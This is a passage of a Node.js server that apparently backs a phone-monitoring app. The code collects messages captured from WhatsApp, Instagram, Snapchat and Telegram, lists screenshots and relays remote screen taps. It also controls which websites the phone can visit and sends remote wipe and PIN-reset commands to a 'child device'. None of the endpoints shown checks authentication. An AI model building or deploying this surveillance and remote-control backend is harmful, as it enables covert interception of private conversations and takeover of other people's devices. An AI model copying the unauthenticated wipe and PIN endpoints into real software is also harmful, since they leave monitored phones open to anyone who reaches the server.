                fromDb = Array.isArray(fromDb) ? fromDb.filter(c => c && c.direction === 'OUT' && c.sentConfirmed === true) : [];
            }
            if (fromDb !== null && fromDb !== undefined) return res.json(fromDb);
        } catch (e) {}
        return res.json([]);
    } catch (e) { res.json([]); }
});

app.get('/api/folder-list/:device_id/:folder', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    let folder = String(req.params.folder || 'screenshot').replace(/[^a-zA-Z0-9_-]/g, '');
    cloudinary.api.resources({
        type: 'upload', prefix: id + '/' + folder + '/', max_results: 100, direction: 'desc',
        next_cursor: req.query.next_cursor || null
    }, (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = (result.resources || []).map(img => img.secure_url);
        res.json({ photos, next_cursor: result.next_cursor || null, folder });
    });
});

app.post('/api/send-command', (req, res) => {
    let { device_id, deviceId, command } = req.body;
    let targetID = device_id || deviceId; 
    if (!targetID || !command) return res.status(400).json({ error: "Missing Info" });
    const id = targetID.toUpperCase().trim();
    io.to(id).emit('command', command);
    console.log(`📡 Command Sent via API: ${command} -> ${id}`);
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    devicesStatus[id].command = command;
    res.json({ status: "success", command: command });
});

// ==================================================
// 🔥 SEND-COMMAND WITH FULL PAYLOAD RELAY (Screen Control)
// ==================================================
io.on('connection', (socket) => {
    // Screen control commands with full payload (x, y, x1, y1, x2, y2, duration, displayWidth, displayHeight)
    socket.on('screen-control', (data) => {
        if (data && data.targetId && data.command) {
            const targetRoom = data.targetId.toString();
            console.log(`🎮 Screen Control: ${data.command} -> ${targetRoom}`, JSON.stringify(data));
            // Forward entire payload to child device
            io.to(targetRoom).emit('control-event', {
                action: data.command,
                x: data.x || 0,
                y: data.y || 0,
                x1: data.x1 || 0,
                y1: data.y1 || 0,
                x2: data.x2 || 0,
                y2: data.y2 || 0,
                duration: data.duration || 300,
                displayWidth: data.displayWidth || 1080,
                displayHeight: data.displayHeight || 2400,
                room: targetRoom
            });
        }
    });

    // Chat batch upload from Android
    socket.on('chat_batch', (data) => {
        if (data && data.device_id && Array.isArray(data.messages)) {
            const id = data.device_id.toString().trim().toUpperCase();
            const chatsDir = path.join(UPLOADS_DIR, 'chats', id);
            if (!fs.existsSync(chatsDir)) fs.mkdirSync(chatsDir, { recursive: true });

            const appMap = { 'com.whatsapp': 'whatsapp', 'com.instagram.android': 'instagram', 'com.snapchat.android': 'snapchat', 'org.telegram.messenger': 'telegram' };

            data.messages.forEach(msg => {
                const appKey = appMap[msg.packageName] || 'unknown';
                if (appKey === 'unknown' || msg.direction !== 'OUT' || msg.sentConfirmed !== true) return;
                const filePath = path.join(chatsDir, `${appKey}.json`);
                let existing = [];
                try {
                    if (fs.existsSync(filePath)) {
                        existing = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                    }
                } catch (e) { existing = []; }

                // HTML-escape text to prevent XSS
                const safeMsg = {
                    id: msg.id || `${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
                    deviceId: id,
                    packageName: msg.packageName || '',
                    conversation: escapeHtml(msg.conversation || 'Unknown'),
                    sender: escapeHtml(msg.sender || 'Unknown'),
                    text: escapeHtml(msg.text || ''),
                    timestamp: msg.timestamp || Date.now(),
                    messageType: msg.messageType || 'TEXT',
                    direction: msg.direction || 'IN',
                    group: msg.group || false,
                    source: msg.source || 'sent_accessibility',
                    sentConfirmed: msg.sentConfirmed === true
                };

                // Dedup: skip if same conversation+text within 5 seconds
                const isDup = existing.some(e => e.conversation === safeMsg.conversation && e.text === safeMsg.text && Math.abs(e.timestamp - safeMsg.timestamp) < 5000);
                if (!isDup) {
                    existing.unshift(safeMsg);
                    // Keep last 30 days worth (max 5000 messages)
                    existing = existing.slice(0, 5000);
                    fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
                }
            });

            // Push live update to dashboard
            io.emit('chat_update', { device_id: id, app: data.app || 'all' });
            console.log(`💬 Chat batch received: ${data.messages.length} msgs from ${id}`);
        }
    });

    // Command acknowledgment from Android
    socket.on('command-ack', (data) => {
        if (data && data.target) {
            const targetRoom = data.target.toString();
            io.to(targetRoom).emit('command-ack', data);
        }
    });
});

// HTML escape helper
function escapeHtml(text) {
    if (!text) return '';
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

// ==================================================
// 🔥 CHAT APIs
// ==================================================
app.get('/api/chats', async (req, res) => {
    const { device, app, contact, search, limit } = req.query;
    if (!device || !app) return res.status(400).json({ error: "Missing device or app" });
    const id = device.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, 'chats', id, `${app}.json`);
    try {
        if (!fs.existsSync(filePath)) return res.json([]);
        let chats = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        if (!Array.isArray(chats)) chats = [];
        chats = chats.filter(c => c && c.direction === 'OUT' && c.sentConfirmed === true);
        if (contact && contact !== 'all') {
            const wanted = contact.toLowerCase();
            chats = chats.filter(c => String(c.conversation || '').toLowerCase() === wanted);
        }
        if (search) {
            const q = search.toLowerCase();
            chats = chats.filter(c => (c.text && c.text.toLowerCase().includes(q)) || (c.sender && c.sender.toLowerCase().includes(q)));
        }
        chats.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        const lim = Math.min(Math.max(parseInt(limit) || 500, 1), 5000);
        res.set('Cache-Control', 'no-store');
        res.json(chats.slice(0, lim));
    } catch (e) { res.json([]); }
});

app.get('/api/chat_contacts', async (req, res) => {
    const { device, app } = req.query;
    if (!device || !app) return res.status(400).json({ error: "Missing device or app" });
    const id = device.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, 'chats', id, `${app}.json`);
    try {
        if (!fs.existsSync(filePath)) return res.json([]);
        const rawChats = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        const chats = Array.isArray(rawChats) ? rawChats.filter(c => c && c.direction === 'OUT' && c.sentConfirmed === true) : [];
        const contactMap = {};
        chats.forEach(c => {
            const conv = c.conversation || 'Unknown';
            if (!contactMap[conv]) {
                contactMap[conv] = { conversation: conv, lastMessage: '', timestamp: 0, count: 0, lastDirection: 'IN' };
            }
            contactMap[conv].count++;
            if ((c.timestamp || 0) > contactMap[conv].timestamp) {
                contactMap[conv].timestamp = c.timestamp;
                contactMap[conv].lastMessage = c.text || '';
                contactMap[conv].lastDirection = c.direction || 'IN';
            }
        });
        const contacts = Object.values(contactMap).sort((a, b) => b.timestamp - a.timestamp);
        res.json(contacts);
    } catch (e) { res.json([]); }
});

// ==================================================
// 🔥 WEBSITE MONITORING APIs
// ==================================================
app.get('/api/websites/:device_id', async (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_websites.json`);
    try {
        if (fs.existsSync(filePath)) { fs.createReadStream(filePath).pipe(res); } else { res.json([]); }
    } catch (e) { res.json([]); }
});

app.get('/api/blocked_websites/:device_id', async (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_blocked_websites.json`);
    try {
        if (fs.existsSync(filePath)) { fs.createReadStream(filePath).pipe(res); } else { res.json([]); }
    } catch (e) { res.json([]); }
});

app.post('/api/blocked_websites/:device_id', async (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_blocked_websites.json`);
    try {
        const { websites } = req.body;
        await fs.promises.writeFile(filePath, JSON.stringify(Array.isArray(websites) ? websites : [], null, 2));
        // Send updated block list to Android
        io.to(id).emit('command', 'block_url:' + JSON.stringify(websites));
        res.json({ status: "success" });
    } catch (e) { res.status(500).json({ error: "Failed" }); }
});

app.post('/api/whitelist_websites/:device_id', async (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_whitelist_websites.json`);
    try {
        const { websites } = req.body;
        await fs.promises.writeFile(filePath, JSON.stringify(Array.isArray(websites) ? websites : [], null, 2));
        io.to(id).emit('command', 'whitelist_url:' + JSON.stringify(websites));
        res.json({ status: "success" });
    } catch (e) { res.status(500).json({ error: "Failed" }); }
});

app.get('/api/whitelist_websites/:device_id', async (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_whitelist_websites.json`);
    try {
        if (fs.existsSync(filePath)) { fs.createReadStream(filePath).pipe(res); } else { res.json([]); }
    } catch (e) { res.json([]); }
});

// ==================================================
// 🔥 WIPE & SECURITY COMMAND APIs
// ==================================================

// Clear specific data type (e.g. live_status history)
app.post('/api/clear-data', async (req, res) => {
    try {
        const id = (req.body.device_id || req.body.deviceId || '').toString().trim().toUpperCase();
        const type = (req.body.type || 'live_status').toString().trim();
        if (!id) return res.status(400).json({ error: 'device_id required' });
        const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
        if (fs.existsSync(filePath)) {
            await fs.promises.writeFile(filePath, '[]');
        }
        // Also clear structured Live Activity history in Mongo
        if (type === 'live_status') {
            try { await mongo.clearActivityEvents(id); } catch (e) {}
        }
        io.to(id).emit('device_data_update', { device_id: id, type });
        res.json({ status: 'success', cleared: type });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Structured Live Activity history (Mongo activity_events) — source of truth for history UI
app.get('/api/activity-events', async (req, res) => {
    try {
        const id = String(req.query.deviceId || req.query.device_id || '').trim().toUpperCase();
        if (!id) return res.status(400).json({ error: 'deviceId required' });
        const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
        const events = await mongo.loadActivityEvents(id, limit);
        res.json(Array.isArray(events) ? events : []);
    } catch (e) {
        res.status(500).json({ error: e.message || 'failed' });
    }
});

app.post('/api/wipe-device', (req, res) => {
    let { device_id } = req.body;
    if (!device_id) return res.status(400).json({ error: "Missing device_id" });
    const id = device_id.toString().trim().toUpperCase();
    io.to(id).emit('command', 'wipe_data');
    console.log(`🗑️ WIPE command sent to: ${id}`);
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    devicesStatus[id].command = 'wipe_data';
    res.json({ status: "success", command: "wipe_data" });
});

app.post('/api/set-pin', (req, res) => {
    let { device_id, pin } = req.body;
    if (!device_id || !pin) return res.status(400).json({ error: "Missing info" });
    const id = device_id.toString().trim().toUpperCase();
    io.to(id).emit('command', 'reset_password:' + pin);
    console.log(`🔑 PIN set command sent to: ${id}`);
    res.json({ status: "success" });
});

// ==================================================
// Boot health status (diagnostics only — not aggressive persistence)
// ==================================================
// In-memory latest boot health per device (fast dashboard fetch)
const latestBootHealth = Object.create(null);

app.post('/api/boot-status', async (req, res) => {
    try {
        let { device_id, deviceId, boot_session_id, bootSessionId, event_type, eventType,
              service_name, serviceName, status, message, timestamp } = req.body || {};
        const id = String(device_id || deviceId || '').trim().toUpperCase();
        if (!id) return res.status(400).json({ error: 'device_id required' });

        const et = String(event_type || eventType || 'SERVICE_STATUS').trim();
        const st = String(status || 'SUCCESS').trim().toUpperCase();
        const svc = String(service_name || serviceName || '').trim();
        const msg = String(message || '').trim();
        const session = String(boot_session_id || bootSessionId || '').trim();
        const ts = Number(timestamp) || Date.now();

        // Dedup key: device + session + service + event + status
        const eventKey = crypto.createHash('sha256')
            .update(`${id}|${session}|${svc}|${et}|${st}`)
            .digest('hex').slice(0, 32);

        const payload = {
            device_id: id,
            boot_session_id: session,
            event_type: et,
            service_name: svc,
            status: st,
            message: msg,
            timestamp: ts,
            eventKey
        };

        // Persist (deduped by eventKey)
        try {
            await mongo.saveBootStatus(id, {
                bootSessionId: session,
                eventType: et,
                serviceName: svc,
                status: st,
                message: msg,
                eventKey,
                timestamp: ts
            });
        } catch (e) {}

        // Update latest snapshot for dashboard
        if (!latestBootHealth[id]) {
            latestBootHealth[id] = { device_id: id, events: [], overall: null };
        }
        const entry = latestBootHealth[id];
        // keep only current session events
        if (entry.boot_session_id && entry.boot_session_id !== session) {
            entry.events = [];
        }
        entry.boot_session_id = session;
        entry.lastEvent = payload;
        entry.updatedAt = ts;
        // avoid duplicate events in memory
        if (!entry.events.some(e => e.eventKey === eventKey)) {
            entry.events.push(payload);
            if (entry.events.length > 40) entry.events = entry.events.slice(-40);
        }
        if (et === 'BOOT_COMPLETE') {
            entry.overall = {
                status: st,
                message: msg,
                boot_session_id: session,
                timestamp: ts
            };
        }

        // Broadcast important statuses only (ERROR / WARNING / BOOT_COMPLETE)
        if (st === 'ERROR' || st === 'WARNING' || et === 'BOOT_COMPLETE') {
            try {
                io.to(id).emit('boot_status', payload);
            } catch (e) {}
        }

        res.json({ status: 'ok', eventKey });
    } catch (e) {
        res.status(500).json({ error: e.message || 'failed' });
    }
});

// Fetch ALL boot events from MongoDB for a device (for frontend display)
app.get('/api/boot-events/:deviceId', async (req, res) => {
    try {
        const id = String(req.params.deviceId || '').trim().toUpperCase();
        if (!id) return res.status(400).json({ error: 'deviceId required' });
        const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
        const events = await mongo.loadAllBootEvents(id, limit);
        res.json(Array.isArray(events) ? events : []);
    } catch (e) {
        res.status(500).json({ error: e.message || 'failed' });
    }
});

app.get('/api/boot-status/:deviceId', async (req, res) => {
    try {
        const id = String(req.params.deviceId || '').trim().toUpperCase();
        if (!id) return res.status(400).json({ error: 'deviceId required' });
        // Prefer in-memory
        if (latestBootHealth[id] && latestBootHealth[id].overall) {
            return res.json({
                device_id: id,
                boot_session_id: latestBootHealth[id].boot_session_id,
                overall: latestBootHealth[id].overall,
                lastEvent: latestBootHealth[id].lastEvent,
                events: latestBootHealth[id].events || []
            });
        }
        // Fallback Mongo
        const row = await mongo.loadLatestBootStatus(id);
        if (!row) return res.json({ device_id: id, overall: null });
        return res.json({
            device_id: id,
            boot_session_id: row.bootSessionId,
            overall: {
                status: row.status,
                message: row.message,
                boot_session_id: row.bootSessionId,
                timestamp: row.timestamp
            },
            lastEvent: {
                device_id: id,
                boot_session_id: row.bootSessionId,
                event_type: row.eventType,
                service_name: row.serviceName,
                status: row.status,
                message: row.message,
                timestamp: row.timestamp
            },
            events: []
        });
    } catch (e) {
        res.status(500).json({ error: e.message || 'failed' });
    }
});

(async()=>{ try{ await mongo.connectMongo(); }catch(e){ console.error(e);} })();
server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
